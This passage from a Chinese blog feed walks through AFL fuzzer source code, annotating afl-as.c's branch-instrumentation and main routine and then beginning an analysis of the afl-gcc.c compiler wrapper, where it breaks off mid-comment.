we do not instrument. */</span></span><br><span class="line">    <span class="comment">//判断框架并赋值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class="line"><span class="comment">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;<span class="comment">//判断是否为intel汇编语法</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;<span class="comment">//判断是否为att汇编语法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class="line">    <span class="comment">//ad-hoc __asm__ 块是否跳过</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class="line"><span class="comment">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class="line"><span class="comment">       we want to catch:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^main:      - function entry point (always instrumented)</span></span><br><span class="line"><span class="comment">         ^.L0:       - GCC branch label</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span><br><span class="line"><span class="comment">         ^\tjnz foo  - conditional branches</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...but not:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^# BB#0:    - clang comments</span></span><br><span class="line"><span class="comment">         ^ # BB#0:   - ditto</span></span><br><span class="line"><span class="comment">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LC0       - GCC non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class="line"><span class="comment">         ^\tjmp foo  - non-conditional jumps</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class="line"><span class="comment">       with no leading dots on labels, hence the weird maze of #ifdefs</span></span><br><span class="line"><span class="comment">       later on.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">       right after the branch (to instrument the not-taken path) and at the</span></span><br><span class="line"><span class="comment">       branch destination label (handled later on). */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查line是否以&#x27;\t&#x27;开头</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">/*如果line形如\tj[!m]...，且R(100) &lt; inst_ratio，进入分支</span></span><br><span class="line"><span class="comment">      其中R(100)会返回一个100以内的随机数，inst_ratio是之前设置的插桩密度，默认100*/</span></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line">        <span class="comment">//向outf中写入trampoline_fmt64/32,长度小于MAP_SIZE(插桩)</span></span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">        ins_lines++;<span class="comment">//插桩计数器++</span></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class="line"><span class="comment">       tread carefully and account for several different formatting</span></span><br><span class="line"><span class="comment">       conventions. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__<span class="comment">//如果是苹果平台</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((colon_pos = <span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>))) &#123;<span class="comment">//判断line中是否有“：”</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; <span class="built_in">isdigit</span>(*(colon_pos - <span class="number">1</span>))) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span><span class="comment">//如果不是苹果，#else与#ifdef对立</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class="line">    <span class="comment">//检查line中是否存在&#x27;:&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line">      <span class="comment">//检查line开头是否是&#x27;.&#x27;</span></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__<span class="comment">//如果是苹果</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span></span><br><span class="line">        <span class="comment">//检查line[1]是否是数字，或者在clang模式下line[0]三个字节是否为&quot;LBB&quot;且随机数小于插桩密度</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">1</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span><span class="comment">//如果不是苹果</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//检查line[2]是否为数字，或者在clang模式下line[1]三个字节是否为&quot;LBB&quot;且随机数小于插桩密度</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class="line"><span class="comment">             That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">             processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">             typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">             about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">             MacOS X). */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line"></span><br><span class="line">        instrument_next = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ins_lines)<span class="comment">//如果插桩计数器不为0</span></span><br><span class="line">    <span class="comment">//向outf写入main_payload_64或32</span></span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) fclose(inf);</span><br><span class="line">  fclose(outf);</span><br><span class="line">  <span class="comment">//如果使用的不是静默模式</span></span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line">    <span class="comment">//如果插桩计数器为0，报错</span></span><br><span class="line">    <span class="keyword">if</span> (!ins_lines) WARNF(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,</span><br><span class="line">                          pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="comment">//否则报告插桩成功</span></span><br><span class="line">    <span class="keyword">else</span> OKF(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">             ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">             getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> :</span><br><span class="line">             (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">             inst_ratio);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 pid;</span><br><span class="line">  u32 rand_seed;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line">  u8* inst_ratio_str = getenv(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);<span class="comment">//读取环境变量并赋值</span></span><br><span class="line">  <span class="comment">//该环境变量主要是控制检查每个分支的概率(0%-100%)，为0时检测函数入口的跳转，不检测函数分支的跳转</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line"></span><br><span class="line">  clang_mode = !!getenv(CLANG_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gettimeofday(&amp;tv, &amp;tz);</span><br><span class="line"></span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();<span class="comment">//设置srandom的随机种子</span></span><br><span class="line"></span><br><span class="line">  srandom(rand_seed);</span><br><span class="line"></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>)</span><br><span class="line">      FATAL(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(AS_LOOP_ENV_VAR))</span><br><span class="line">    FATAL(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  setenv(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);<span class="comment">//设置环境变量AS_LOOP_ENV_VAR为1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class="line"><span class="comment">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class="line"><span class="comment">     that... */</span></span><br><span class="line">  <span class="comment">//判断两者的值是否有1的情况</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    sanitizer = <span class="number">1</span>;</span><br><span class="line">    inst_ratio /= <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*如果不是只查阅version，就进入add_instrumentation函数，该函数主要处理输入文件，</span></span><br><span class="line"><span class="comment">  生成modified_file，将桩插入释放的位置*/</span></span><br><span class="line">  <span class="keyword">if</span> (!just_version) add_instrumentation();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;<span class="comment">//调用fork函数创建一个子进程</span></span><br><span class="line"></span><br><span class="line">    execvp(as_params[<span class="number">0</span>], (<span class="keyword">char</span>**)as_params);<span class="comment">//子进程执行该指令</span></span><br><span class="line">    <span class="comment">/*这是因为我们执行execvp执行的时候，as_params[0]会完全替换掉当前进程中的程序，</span></span><br><span class="line"><span class="comment">    如果不通过子程序执行实际的as，后续就无法在执行完实际的as之后，还能unlink掉modified_file*/</span></span><br><span class="line">    FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line">  <span class="comment">//等待子程序结束</span></span><br><span class="line">  <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) PFATAL(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line">  <span class="comment">//读取环境变量AFL_KEEP_ASSEMBLY的值，如果没有设置，就unlink掉modified_file</span></span><br><span class="line">  <span class="comment">//设置该环境变量是为了反之afl-as删掉插桩后的汇编文件，设置为1会保留插桩后的汇编文件</span></span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) unlink(modified_file);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(WEXITSTATUS(status));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考博客：</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/121332118">https://blog.csdn.net/qq_41202237/article/details/121332118</a></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://paper.seebug.org/1732/">https://paper.seebug.org/1732/</a></p>]]></content>
      
      
      <categories>
          
          <category> 源码分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL源码分析之afl-gcc.c</title>
      <link href="/2022/03/03/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bafl-gcc-c/"/>
      <url>/2022/03/03/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bafl-gcc-c/</url>
      
        <content type="html"><![CDATA[<p>   AFL 源码初探，分析的是 afl-gcc.c</p><p>初号机师傅博客里写道：afl-gcc 是 gcc 的一个封装（wrapper），能够实现对于一些关键节点进行插桩，从而记录一些程序执行路径之类的信息，方便对程序的一些运行情况进行反馈。</p><p>分析完整个源码后感觉，afl-gcc 更多的是做了一些检查，并且对参数(路径)进行了整理，并没有执行关键步骤，比如插桩(只是个人猜测)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Copyright 2013 Google LLC All rights reserved.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">  you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">  You may obtain a copy of the License at:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   american fuzzy lop - wrapper for GCC and clang</span></span><br><span class="line"><span class="comment">   ----------------------------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Written and maintained by Michal Zalewski &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This program is a drop-in replacement for GCC or clang. The most common way</span></span><br><span class="line"><span class="comment">   of using it is to pass the path to afl-gcc or afl-clang via CC when invoking</span></span><br><span class="line"><span class="comment">   ./configure.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   (Of course, use CXX and point it to afl-g++ / afl-clang++ for C++ code.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The wrapper needs to know the path to afl-as (renamed to &#x27;as&#x27;). The default</span></span><br><span class="line"><span class="comment">   is /usr/local/lib/afl/. A convenient way to specify alternative directories</span></span><br><span class="line"><span class="comment">   would be to set AFL_PATH.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   If AFL_HARDEN is set, the wrapper will compile the target app with various</span></span><br><span class="line"><span class="comment">   hardening options that may help detect memory management issues more</span></span><br><span class="line"><span class="comment">   reliably. You can also specify AFL_USE_ASAN to enable ASAN.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span 